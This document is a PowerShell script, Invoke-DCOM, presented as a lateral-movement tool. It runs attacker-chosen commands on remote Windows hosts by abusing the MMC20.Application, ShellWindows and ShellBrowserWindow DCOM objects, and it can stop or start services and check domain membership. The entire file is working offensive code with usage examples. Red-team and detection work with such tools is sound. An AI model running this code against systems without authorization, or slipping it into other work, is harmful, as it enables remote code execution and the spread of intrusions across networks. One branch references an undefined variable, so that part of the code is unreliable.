<#

    DCOM Lateral Movement
    Author: Steve Borosh (@rvrsh3ll)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

#>

function Invoke-DCOM {
<#
    .SYNOPSIS

        Execute's commands via various DCOM methods as demonstrated by (@enigma0x3)
        http://www.enigma0x3.net

        Author: Steve Borosh (@rvrsh3ll)        
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        Invoke commands on remote hosts via MMC20.Application COM object over DCOM.

    .PARAMETER Target

        IP Address or Hostname of the remote system

    .PARAMETER Type

        Specifies the desired type of execution

    .PARAMETER Command

        Specifies the desired command to be executed

    .EXAMPLE

        Import-Module .\Invoke-DCOM.ps1
        Invoke-DCOM -Target '192.168.2.100' -Type MMC20 -Command "calc.exe"
        Invoke-DCOM -Target '192.168.2.100' -Type ServiceStart "MyService"
#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true)]
        [String]
        $Target,

        [Parameter(Mandatory = $true, Position = 1)]
        [ValidateSet("MMC20", "ShellWindows","ShellBrowserWindow","CheckDomain","ServiceCheck","MinimizeAll","ServiceStop","ServiceStart")]
        [String]
        $Type = "MMC20",

        [Parameter(Mandatory = $false, Position = 2)]
        [string]
        $ServiceName,

        [Parameter(Mandatory = $false, Position = 3)]
        [string]
        $Command
    )

    Begin {

    #Declare some DCOM objects
       if ($Type -Match "ShellWindows") {

            [String]$DCOM = '9BA05972-F6A8-11CF-A442-00A0C90A8F39'
        }
        
        elseif ($Type -Match "ShellBrowserWindow") {

            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
        }

        elseif ($Type -Match "CheckDomain") {

            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
        }

        elseif ($Type -Match "ServiceCheck") {

            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
        }

        elseif ($Type -Match "MinimizeAll") {

            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
        }

        elseif ($Type -Match "ServiceStop") {

            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
        }

        elseif ($Type -Match "ServiceStart") {

            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
        }
    }
    
    
    Process {

        #Begin main process block

        #Check for which type we are using and apply options accordingly
        if ($Type -Match "MMC20") {

            $Com = [Type]::GetTypeFromProgID("MMC20.Application","$Target")
            $Obj = [System.Activator]::CreateInstance($Com)
            $Obj.Document.ActiveView.ExecuteShellCommand("$Command",$null,$null,"7")
        }
        elseif ($Type -Match "ShellWindows") {

            $Com = [Type]::GetTypeFromCLSID("$DCOM","$Target")
            $Obj = [System.Activator]::CreateInstance($Com)
            $Item = $Obj.Item()
            $Item.Document.Application.ShellExecute("cmd.exe","/c $Command","c:\windows\system32",$null,0)
        }

        elseif ($Type -Match "ShellBrowserWindow") {

            $Com = [Type]::GetTypeFromCLSID("$DCOM","$Target")
            $Obj = [System.Activator]::CreateInstance($Com)
            $Item.Document.Application.ShellExecute("cmd.exe","/c $Command","c:\windows\system32",$null,0)
        }

        elseif ($Type -Match "CheckDomain") {

            $Com = [Type]::GetTypeFromCLSID("$DCOM","$Target")
            $Obj = [System.Activator]::CreateInstance($Com)
            $obj.Document.Application.GetSystemInformation("IsOS_DomainMember")
        }

        elseif ($Type -Match "ServiceCheck") {

            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$Target")
            $Obj = [System.Activator]::CreateInstance($Com)
            $obj.Document.Application.IsServiceRunning("$ServiceName")
        }

        elseif ($Type -Match "MinimizeAll") {

            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$Target")
            $Obj = [System.Activator]::CreateInstance($Com)
            $obj.Document.Application.MinimizeAll()
        }

        elseif ($Type -Match "ServiceStop") {

            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$Target")
            $Obj = [System.Activator]::CreateInstance($Com)
            $obj.Document.Application.ServiceStop("$ServiceName")
        }
        
        elseif ($Type -Match "ServiceStart") {

            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$Target")
            $Obj = [System.Activator]::CreateInstance($Com)
            $obj.Document.Application.ServiceStart("$ServiceName")
        }
    }

    End {

        Write-Output "Completed"
    }
    

}
